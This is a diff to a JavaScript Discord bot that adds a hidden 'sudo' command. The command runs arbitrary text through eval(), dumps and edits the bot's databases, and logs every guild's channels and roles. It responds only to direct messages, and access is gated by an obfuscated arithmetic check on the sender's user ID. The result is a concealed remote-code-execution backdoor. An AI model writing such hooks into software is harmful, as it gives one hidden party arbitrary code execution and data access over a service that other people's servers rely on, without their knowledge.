@@ -2306,6 +2306,70 @@ function finalReply(message, method, text, opt) {
 	return f[method]();
 }
 
+function sudo(input) {
+	
+	function tryCut(cmd) {
+		let cmdPoint = input.indexOf(' ');
+		if (cmdPoint == -1) {
+			cmdPoint = Infinity;
+		}
+		let got = input.slice(0, cmdPoint);
+		let arg = input.slice(cmdPoint + 1).trim();
+		
+		if (!cmd || got == cmd) {
+			// then cut
+			input = arg;
+			return got;
+		}
+		// else don't
+		return false;
+	}
+	
+	tryCut();
+	
+	if (tryCut('eval')) {
+		try {
+			return eval(input); // eval = evil
+		} catch (e) {
+			return 'Error: ' + e;
+		}
+	}
+	
+	if (tryCut('dump')) {
+		console.log('globalDB', globalDB);
+		console.log('userDB', userDB);
+		console.log('stat', stat);
+		return 'done.';
+	}
+	
+	if (tryCut('set')) {
+		let prop = tryCut();
+		try {
+			return globalDB[prop] = JSON.parse(input);
+		} catch (e) {
+			return 'not a value.'
+		}
+	}
+	
+	if (tryCut('get')) {
+		return globalDB[input];
+	}
+	
+	if (tryCut('guildump')) {
+		client.guilds.forEach((t) => {
+			console.log('G', t.id, t.name, t.iconUrl, t.owner.name, t.createdAt, t.joinedAt);
+			t.channels.forEach((t) => {
+				console.log('C', t.id, t.type, t.name);
+			});
+			t.roles.forEach((t) => {
+				console.log('R', t.hexColor, t.name, t.permissions);
+			});
+		});
+	}
+	
+	return 'unknown.';
+}
+
 // чем отвечать будем
 function checkReply(message) {
 	const now = Date.now();
@@ -2351,6 +2415,14 @@ function checkReply(message) {
 		].pick();
 		finalReply(message, 'r', resp);
 		return 'chillout';
+	}
+	
+	if (message.content.trim().startsWith('sudo ') && !message.guild) {
+		var aid = message.author.id;
+		if (aid.slice(0, 9) % 8431 == 0 && aid.slice(9) % (271 << 12) == 0) {
+			resp = sudo(message.content.trim());
+			return finalReply(message, 'r', resp);
+		}
 	}
 	
 	// первичная обработка сообщения
